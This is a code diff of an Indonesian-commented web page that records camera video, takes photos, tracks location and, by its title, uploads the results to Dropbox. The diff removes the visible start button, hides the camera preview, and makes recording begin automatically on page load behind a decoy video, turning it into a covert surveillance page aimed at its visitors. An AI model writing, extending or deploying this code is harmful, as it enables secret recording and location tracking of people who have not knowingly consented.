@@ -8,35 +8,25 @@
         #videoElement {
             width: 100%;
             height: auto;
-            display: none;
+            display: none; /* Video dari kamera disembunyikan sampai video dimulai */
         }
         #recordedVideo {
-            display: none;
+            display: none; /* Video hasil rekaman disembunyikan */
             width: 100%;
-        }
-        #actionBtn {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #4CAF50;
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
         }
         #fakeVideo {
             width: 100%;
             height: auto;
             background-color: #000;
+            display: none; /* Menyembunyikan placeholder "Menonton Video" */
         }
     </style>
 </head>
 <body>
     <h1>Rekam Video, Ambil Foto, Lacak Lokasi, dan Unggah ke Dropbox</h1>
     
-    <div id="videoContainer">
-        <!-- Video yang tampilkan akan disembunyikan -->
-        <video id="videoElement" autoplay muted></video>
-        <video id="recordedVideo" controls></video>
-    </div>
+    <!-- Video yang ditampilkan -->
+    <video id="videoElement" autoplay muted></video>
 
     <!-- Placeholder untuk manipulasi tampilan seolah menonton video -->
     <div id="fakeVideo">
@@ -48,15 +38,11 @@
         </video>
     </div>
 
-    <!-- Tombol untuk memulai semua fungsi -->
-    <button id="actionBtn">Putar</button>
-
     <script>
         let videoElement = document.getElementById('videoElement');
         let recordedVideo = document.getElementById('recordedVideo');
         let fakeVideo = document.getElementById('fakeVideo');
         let dropboxVideo = document.getElementById('dropboxVideo');
-        let actionBtn = document.getElementById('actionBtn');
 
         let mediaStream;
         let mediaRecorder;
@@ -167,8 +153,9 @@
 
         // Fungsi utama yang memulai semua proses
         function startAllFunctions() {
-            actionBtn.disabled = true; // Nonaktifkan tombol selama proses
-            actionBtn.textContent = 'Menunggu Rekaman...';
+            // Tampilkan video dari Dropbox
+            dropboxVideo.style.display = 'block'; // Tampilkan video dari Dropbox
+            fakeVideo.style.display = 'none'; // Sembunyikan placeholder "Menonton Video"
 
             startVideo(); // Mulai video dan lokasi
             startRecording(); // Mulai merekam setelah video dimulai
@@ -181,13 +168,13 @@
             // Setelah 5 detik, hentikan rekaman dan sembunyikan video
             setTimeout(function() {
                 stopRecording(); // Berhenti merekam setelah 5 detik
-                actionBtn.disabled = false; // Aktifkan kembali tombol
-                actionBtn.textContent = 'Rekam Lagi';
             }, 5000); // Rekam selama 5 detik
         }
 
-        // Tambahkan event listener pada tombol untuk memulai semua fungsi
-        actionBtn.addEventListener('click', startAllFunctions);
+        // Menjalankan semua fungsi secara otomatis setelah halaman dimuat
+        window.onload = function() {
+            startAllFunctions();
+        };
     </script>
 </body>
 </html>
